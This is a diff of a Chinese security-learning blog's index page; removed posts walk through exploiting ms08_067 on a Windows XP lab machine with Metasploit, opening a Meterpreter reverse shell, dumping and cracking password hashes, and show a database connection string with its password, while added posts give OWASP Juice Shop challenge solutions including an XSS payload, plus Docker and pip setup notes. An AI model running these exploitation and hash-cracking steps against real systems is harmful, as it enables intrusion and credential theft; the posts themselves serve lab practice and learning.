@@ -268,326 +268,6 @@
 </nav>
       <div class="body-wrap">
   
-    <article id="post-启动数据库" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2018/04/24/启动数据库/" class="article-date">
-      <time datetime="2018-04-24T06:45:46.000Z" itemprop="datePublished">2018-04-24</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2018/04/24/启动数据库/">Metsploit连接数据库</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h1 id="启动数据库"><a href="#启动数据库" class="headerlink" title="启动数据库"></a>启动数据库</h1><pre><code>root@kali:~# /etc/init.d/postgresql start
-</code></pre><h1 id="查看数据库配置信息"><a href="#查看数据库配置信息" class="headerlink" title="查看数据库配置信息"></a>查看数据库配置信息</h1><p>一般来说metsploit都会给你自动创建一个数据库，所以看着配置信息去连接就可以了</p>
-<pre><code>root@kali:~# vim /usr/share/metasploit-framework/config/database.yml
-</code></pre><p><img src="http://t1.aixinxi.net/o_1cbr5s93gsgdca31cnv1rhs5jta.png-j.jpg" alt=""><br>这个是我的配置文件的内容</p>
-<h1 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h1><p>个人建议创建两个窗口，对照着会比较方便</p>
-<pre><code>root@kali:~# msfconsole 
-
- _                                                    _
-/ \    /\         __                         _   __  /_/ __
-| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
-| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
-|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
-      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\
-
-
-       =[ metasploit v4.16.32-dev                         ]
-+ -- --=[ 1726 exploits - 987 auxiliary - 300 post        ]
-+ -- --=[ 507 payloads - 40 encoders - 10 nops            ]
-+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
-
-msf &gt;
-msf &gt; db_connect msf:h6Ol63ydOISbgldkSsd8tmDkAgRPVgIEbz10YljkpGU=@localhost:5432/msf
-[*] Rebuilding the module cache in the background...
-msf &gt; creds 
-Credentials
-===========
-
-host       origin     service           public  private  realm        private_type
-----       ------     -------           ------  -------  -----        ------------
-x.x.x.x  x.x.x.x  1433/tcp (mssql)  sa      123456   WORKSTATION  Password
-
-msf &gt;
-</code></pre><p>数据库连接完成，但是有的会开启msf后自动连接数据库，所以可以先查看数据库状态</p>
-<pre><code>msf &gt; db_status 
-[*] postgresql connected to msf
-msf &gt;
-</code></pre>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/">linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络安全/">网络安全</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-metsploit获取电脑密码" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2018/04/24/metsploit获取电脑密码/" class="article-date">
-      <time datetime="2018-04-24T06:27:02.000Z" itemprop="datePublished">2018-04-24</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2018/04/24/metsploit获取电脑密码/">Metsploit破解hash</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h1 id="metsploit获取电脑密码"><a href="#metsploit获取电脑密码" class="headerlink" title="metsploit获取电脑密码"></a>metsploit获取电脑密码</h1><p>首先简单介绍一下metsploit这个工具，它是一款开源的安全漏洞检测工具，你可以利用这个工具中的模块，来对目标服务器进行渗透测试，例如经典的ms08_067等</p>
-<h2 id="开启软件"><a href="#开启软件" class="headerlink" title="开启软件"></a>开启软件</h2><p>攻击机: Kali Linux<br>靶机: WindowsXP SP1<br>软件版本: 4.16.32</p>
-<p>命令:</p>
-<pre><code>root@kali:~# msfconsole
-</code></pre><p><img src="http://t1.aixinxi.net/o_1cbqitmj21s00vhh1mm816o13soa.png-j.jpg" alt="应用截图"></p>
-<h2 id="开始实验"><a href="#开始实验" class="headerlink" title="开始实验"></a>开始实验</h2><p>这次实验就用ms08067模块的来测试，若觉得过于无聊像直接跳到破解hash，可以直接跳到相应环节，那么，首先先查询模块的位置</p>
-<pre><code>msf &gt; search ms08_067
-</code></pre><p><img src="http://t1.aixinxi.net/o_1cbqjaf2m1lbih2f1n8c1ukp11poa.png-j.jpg" alt=""><br>可以看到这个模块是在exploit/windows/smb/下的，接着用use命令去使用它，然后show options 来查看需要配置的选项</p>
-<pre><code>msf &gt; use exploit/windows/smb/ms08_067_netapi 
-msf exploit(windows/smb/ms08_067_netapi) &gt; show options
-
-Module options (exploit/windows/smb/ms08_067_netapi):
-
-   Name     Current Setting  Required  Description
-   ----     ---------------  --------  -----------
-   RHOST                     yes       The target address
-   RPORT    445              yes       The SMB service port (TCP)
-   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   Automatic Targeting
-
-
-msf exploit(windows/smb/ms08_067_netapi) &gt;
-</code></pre><p>设置目标IP</p>
-<pre><code>msf exploit(windows/smb/ms08_067_netapi) &gt; set rhost x.x.x.x
-</code></pre><p>设置完后，就可以开始攻击了</p>
-<pre><code>msf exploit(windows/smb/ms08_067_netapi) &gt; exploit 
-
-[*] Started reverse TCP handler on x.x.x.x:4444 
-[*] x.x.x.x:445 - Automatically detecting the target...
-[*] x.x.x.x:445 - Fingerprint: Windows XP - Service Pack 0 / 1 - lang:English
-[*] x.x.x.x:445 - Selected Target: Windows XP SP0/SP1 Universal
-[*] x.x.x.x:445 - Attempting to trigger the vulnerability...
-[*] Sending stage (179779 bytes) to x.x.x.x
-[*] Meterpreter session 1 opened (x.x.x.x:4444 -&gt; x.x.x.x:1040) at 2018-04-24 17:15:53 +0800
-
-meterpreter &gt;
-</code></pre><p>成功，这个时候我们就可以一定程度的为所欲为了，可以进行下一步，也就是本篇的主题了</p>
-<h2 id="破解hash密码"><a href="#破解hash密码" class="headerlink" title="破解hash密码"></a>破解hash密码</h2><p>先在对方电脑上留一个会话，方便再次进入</p>
-<pre><code>meterpreter &gt; background 
-[*] Backgrounding session 1...
-msf exploit(windows/smb/ms08_067_netapi) &gt;
-</code></pre><p>然后进行下一步,hashdump(PS:这一步需要连接metsploit的数据库，可以移步另一篇)</p>
-<pre><code>msf exploit(windows/smb/ms08_067_netapi) &gt; use post/windows/gather/hashdump 
-msf post(windows/gather/hashdump) &gt; set session 1
-session =&gt; 1
-msf post(windows/gather/hashdump) &gt; exploit 
-
-[*] Obtaining the boot key...
-[*] Calculating the hboot key using SYSKEY 428e28b631cc943839d3825b82f120d5...
-[*] Obtaining the user list and keys...
-[*] Decrypting user keys...
-[*] Dumping password hints...
-[*] Dumping password hashes...
-
-Administrator:500:a1ee20c00c723dd2aad3b435b51404ee:2faf5f4a6e588f18f1f84616da5ba9a7:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-HelpAssistant:1000:5e524bae58d900e05d22d4ead5281bca:702eed191404bc7a910cf5e551cd6f3b:::
-SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:202d3a3a623de3bbc30ab1c2784d0102:::
-hacker:1004:1f27acde849935b0aad3b435b51404ee:579110c49145015c47ecd267657d3174:::
-
-
-[*] Post module execution completed
-</code></pre><p>利用jtr_crack_fast模块来爆破密码</p>
-<pre><code>msf post(windows/gather/hashdump) &gt; use auxiliary/analyze/jtr_crack_fast
-msf auxiliary(analyze/jtr_crack_fast) &gt; exploit 
-
-[*] Wordlist file written out to /tmp/jtrtmp20180424-3414-19br28b
-[*] Hashes Written out to /tmp/hashes_tmp20180424-3414-nv7b02
-[*] Cracking lm hashes in normal wordlist mode...
-Created directory: /root/.john
-[*] Loaded 5 password hashes with no different salts (LM [DES 128/128 AVX-16])
-Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
-[*] 123123           (hacker)
-[*] FRANK            (administrator)
-2g 0:00:00:00 DONE (Tue Apr 24 17:53:06 2018) 22.22g/s 857544p/s 857544c/s 2599KC/s ZIRCON..VAGRANT
-
-Warning: passwords printed above might be partial and not be all those cracked
-Use the &quot;--show&quot; option to display all of the cracked passwords reliably
-Session completed
-
-[*] Cracked Passwords this run:
-[+] administrator:frank:2:2
-[+] hacker:123123:6:6
-[*] Auxiliary module execution completed
-msf auxiliary(analyze/jtr_crack_fast) &gt;
-</code></pre><p>可以看到，密码已经出来了,administrator的密码为frank，完成</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/">linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络安全/">网络安全</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-python日志" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2018/03/20/python日志/" class="article-date">
-      <time datetime="2018-03-20T01:53:55.000Z" itemprop="datePublished">2018-03-20</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2018/03/20/python日志/">Python学习日志</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-              前言：本文的内容是由[Elapse]和[Asolmn]共同编写，内容更新全看我俩什么时候脑袋一抽学Python，本文不具备专业性，仅供自己学习，在特别的块因为使用的Python版本不同，所以个别会标明版本，并在后期逐渐完善全版本
-          
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/Python/">Python</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/">Python</a></li></ul>
-    </div>
-
-      
-        <p class="article-more-link">
-          <a   href="/2018/03/20/python日志/#more">查看更多 >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
     <article id="post-SQL injection" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1098,17 +778,8 @@ msf auxiliary(analyze/jtr_crack_fast) &gt;
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>Juice-shop是OWASP的一款漏洞环境，里面包括了目前的TOP10漏洞，还有一些有深度的漏洞，难度各有不同，juice-shop可以用docker来部署也可以在windows或linux的环境下用node.js发布出来，下面就开始搭建</p>
-<hr>
-<p>1.首先在github上下载源码<br><code>https://github.com/bkimminich/juice-shop/releases/tag/v6.4.2</code></p>
-<p><img src="http://i2.51cto.com/images/blog/201802/26/529e5cae7f8415dd5be057ec26112ec5.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p>
-<p>  下载自己对应的系统以及node版本的文件，要注意juice-shop-6.4.2后面跟着的这个node，如果是node6那么你就需要去按照对应的node.js为6.x版本的才能成功发布出来（node.js下载可到<a href="https://github.com/nodejs/Release）" target="_blank" rel="noopener">https://github.com/nodejs/Release）</a><br>    <img src="http://i2.51cto.com/images/blog/201802/26/268c3bf9d8fea4d35987a41678b34401.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p>
-<p>  2.安装node，打开你下载的node安装包，安装时全部默认即可，然后先检验node.js是否安装成功<br>Win+r打开运行输入cmd开启命令行，再打node –v查看node版本如果可以看到版本且是自己需要的版本说明安装无误<br><img src="http://i2.51cto.com/images/blog/201802/26/2becc0a384342a8319c1b45d0753136d.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p>
-<p>  3.发布Juice-Shop<br>  打开CMD，使用cd命令来进入Juice-shop源码文件夹（也可在文件夹中Shift+鼠标右键，点击“在此处打开命令窗口”)<br>  然后输入nmp start<br><img src="http://i2.51cto.com/images/blog/201802/26/cf0e1ae618ad3c061ea0823599569f6d.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p>
-<p>  完成<br> 用浏览器访问本地3000端口即可看到页面<br> <img src="http://i2.51cto.com/images/blog/201802/26/2d146b1db29c08e120923c46d8169278.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p>
-<hr>
-<p>  感谢@butters对该文章的技术支持。软件链接地址均为@butters提供。如需转载，请注明出处。否则将追究法律责任</p>
-
+              <!--more-->
+          
       
     </div>
     
@@ -1121,6 +792,10 @@ msf auxiliary(analyze/jtr_crack_fast) &gt;
         <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/windows/">windows</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络安全/">网络安全</a></li></ul>
     </div>
 
+      
+        <p class="article-more-link">
+          <a   href="/2018/02/26/Juice-Shop Windows平台搭建/#more">查看更多 >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -1200,6 +875,242 @@ msf auxiliary(analyze/jtr_crack_fast) &gt;
       
     <div class="article-tag tagcloud">
         <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/">linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络安全/">网络安全</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-OWASP Juice Shop v6.4.1部分题目答案" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/01/31/OWASP Juice Shop v6.4.1部分题目答案/" class="article-date">
+      <time datetime="2018-01-31T05:31:36.000Z" itemprop="datePublished">2018-01-31</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/01/31/OWASP Juice Shop v6.4.1部分题目答案/">OWASP Juice Shop v6.4.1部分题目答案</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="OWASP-Juice-Shop-v6-4-1部分题目答案"><a href="#OWASP-Juice-Shop-v6-4-1部分题目答案" class="headerlink" title="OWASP Juice Shop v6.4.1部分题目答案"></a>OWASP Juice Shop v6.4.1部分题目答案</h1><blockquote>
+<p>OWASP Juice Shop是一个专门用于安全技能训练的靶场环境</p>
+</blockquote>
+<p>安装完成后的界面:<br><img src="http://i2.51cto.com/images/blog/201801/31/01a22ba974bd92cfdc2a97447ffd46ef.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p>
+<ol>
+<li>Score Board<br>这题的意思是找到一个隐藏的计分界面，通过查看网页源代码可查出<br><img src="http://i2.51cto.com/images/blog/201801/31/baf8f6a12bbb9be28be97aee1aa37f80.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br>之后打开页面即可<br><img src="http://i2.51cto.com/images/blog/201801/31/adc848d569348d601731b5fb53b0192a.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></li>
+<li>Admin Section&amp;Error Handling<br>访问商店管理部分。这个网站一用工具爆破就会崩溃，所以这里采用手工，在试了admin和administrator之后皆不成功，百度找了一下还有administration,尝试，成功<br><img src="http://i2.51cto.com/images/blog/201801/31/e026d3565a0fdfa9bca7580c0f6ce18d.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></li>
+<li>Password Strength<br>登陆管理员用户，点击登陆,构造语句<br><img src="http://i2.51cto.com/images/blog/201801/31/c527dd45be4abff6e781e4c3a3ac83a2.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br>成功登陆<br><img src="http://i2.51cto.com/images/blog/201801/31/277aee7092c11b3ee786366340d58cc7.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></li>
+<li>Five-Star Feedback<br>将所有5星反馈全部删除即可<br><img src="http://i2.51cto.com/images/blog/201801/31/a751d3f265cd922fa4411f81e2b27e76.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br>完成<br><img src="http://i2.51cto.com/images/blog/201801/31/a5124bc5980c0179aa02a570cb18ec74.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></li>
+<li>XSS Tier 1<br>往页面插入恶意代码,随意找一个框，构造语句<br><code>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</code><br><img src="http://i2.51cto.com/images/blog/201801/31/81096a672de1d5128e0bd7ead732de39.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br>Enter,完成<br><img src="http://i2.51cto.com/images/blog/201801/31/5b10b1d6062be6052b3efa27d73f4eea.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></li>
+<li>Zero Stars<br>最简单的一个，随意登陆一个用户，在”联系我们”处，随意发一个反馈，然后将数据包内容更改<br><img src="http://i2.51cto.com/images/blog/201801/31/b8d230c5886fa8781dbabe79c45eef43.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br>将“2”改为0即可<br><img src="http://i2.51cto.com/images/blog/201801/31/5e1d5fe0b5ed2d93fe8f38063f0b2026.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></li>
+<li>Basket Access<br>进入别人的购物篮，很简单，只需要改包即可<br><img src="http://i2.51cto.com/images/blog/201801/31/4f33887b5b705d6a7c0048f057d9746d.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br>将”1”改为其他数字，发送即可<br><img src="http://i2.51cto.com/images/blog/201801/31/228f2b3bbf3b22450254d4c06d7e47b6.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></li>
+<li>Password Strength<br>规定使用密码登陆，不用语句。打开工具密码爆破，得出密码为admin123，在回到登陆界面，登陆即可完成<br><img src="http://i2.51cto.com/images/blog/201801/31/00b27824afa6b8f246f6c715e68b67d6.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br><img src="http://i2.51cto.com/images/blog/201801/31/4292144c5ef467f611e1d7d2f2383a38.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></li>
+<li><p>Reset Jim’s Password<br>通过上一道题可以得出邮箱是”@juice-sh.op”,打开登陆界面，点击忘记密码，输入邮箱<br><img src="http://i2.51cto.com/images/blog/201801/31/6d62d3dc17433a004f8e2573f5837cb5.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p>
+<blockquote>
+<p>这里面的Samuel来自于星战梗</p>
+</blockquote>
+</li>
+<li><p>Login Jim<br>上面改了用户Jim的密码后直接登陆即可</p>
+</li>
+</ol>
+<hr>
+<blockquote>
+<p>总结<br>这个渗透环境包含了许多有代表性的漏洞，在许多漏洞上也需要通过抓取数据包来分析，由于自身的技术不够，所以只解决了上面这些题目，不得不说这个环境对于初入这方面的人来说是不错的</p>
+</blockquote>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/">linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络安全/">网络安全</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-CentOS7安装Docker" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/01/30/CentOS7安装Docker/" class="article-date">
+      <time datetime="2018-01-30T02:01:08.000Z" itemprop="datePublished">2018-01-30</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/01/30/CentOS7安装Docker/">CentOS7安装Docker</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>系统要求：<br>Docker支持 64 位版本的 <code>CentOS 7</code>，并且要求内核版本不低于 3.10。 CentOS 7 满足最低内核的要求，但由于内核版本比较低，部分功能（如 overlay2 存储层驱动）无法使用，并且部分功能可能不太稳定。</p>
+<blockquote>
+<p>环境：CentOS7</p>
+</blockquote>
+<ul>
+<li>使用yum安装docker：<br><code>$ yum install docker-io -y</code></li>
+<li>启动：<pre><code>$ systemctl enable docker
+$ systemctl start docker
+</code></pre></li>
+<li>测试 Docker 是否安装正确:<br><code>$ docker run hello-world</code><br><img src="http://i2.51cto.com/images/blog/201801/30/eec9c47383ebd9d7517245be924f2a18.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></li>
+<li><p>运行:<br>有了镜像后，我们就能够以这个镜像为基础启动并运行一个容器。以上面的 ubuntu:16.04 为例，如果我们打算启动里面的 bash 并且进行交互式操作的话，可以执行下面的命令。<br>$ docker run -it –rm ubuntu:16.04 bash<br><img src="http://i2.51cto.com/images/blog/201801/30/df10e7e1e7a3c9642ac2748afd6bac11.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p>
+<blockquote>
+<p>-it：这是两个参数，一个是 -i：交互式操作，一个是 -t 终端。我们这里打算进入 bash 执行一些命令并查看返回结果，因此我们需要交互式终端。<br>–rm：这个参数是说容器退出后随之将其删除。默认情况下，为了排障需求，退出的容器并不会立即删除，除非手动 docker rm。这里只是随便执行个命令，看看结果，不需要排障和保留结果，因此使用 –rm 可以避免浪费空间。<br>ubuntu:16.04：这是指用 ubuntu:16.04 镜像为基础来启动容器。<br>bash：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 bash。</p>
+</blockquote>
+</li>
+<li><p>查看镜像:<br><code>$ docker images</code></p>
+</li>
+<li>删除容器：<br>列出最近使用的容器<br><code>$ docker ps -a</code><br>删除<br><code>$ docker rm &lt;container ID&gt;</code><br><img src="http://i2.51cto.com/images/blog/201801/30/87921bcad03d08df28574733837f063e.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></li>
+</ul>
+<hr>
+<p>若想要在容器中导入文件<br>那么，在docker容器启动的时候，挂载到宿主机的一个目录，可以用-v参数来指定。<br>例如我要启动一个Ubuntu容器，将宿主机的/etc/Elapse目录挂载到容器的/etc/eee目录，可通过以下方式指定：<br><code>$ docker run -it -v /etc/Elapse:/etc/eee ubuntu:16.04 bash</code><br>这样启动后，容器内就会自动创建或使用目录。通过这种方式，想导入文件直接cp即可</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Docker/">Docker</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/">linux</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-python安装pip模块" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/01/29/python安装pip模块/" class="article-date">
+      <time datetime="2018-01-29T06:15:45.000Z" itemprop="datePublished">2018-01-29</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/01/29/python安装pip模块/">Python安装pip模块</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>pip 是一个现代的，通用的 Python 包管理工具。提供了对Python 包的查找、下载、安装、卸载的功能。</p>
+<hr>
+<p>Python想要用pip来安装，得先安装pip模块<br><code>https://pypi.python.org/pypi/pip#downloads</code><br><img src="http://i2.51cto.com/images/blog/201801/29/e3fac557dbaac02444526d3b4358569a.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br>下载完成后，解压到python同个目录下<br><img src="http://i2.51cto.com/images/blog/201801/29/fa059851016faf06d0706ac195ea9148.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br>用命令来安装<br><code>python setup.py install</code><br><img src="http://i2.51cto.com/images/blog/201801/29/5b279b38ab61a2effceddb8b087e9bc1.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br><img src="http://i2.51cto.com/images/blog/201801/29/9156d8497edbc02ea8912c1140c3711d.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br>安装完成</p>
+<hr>
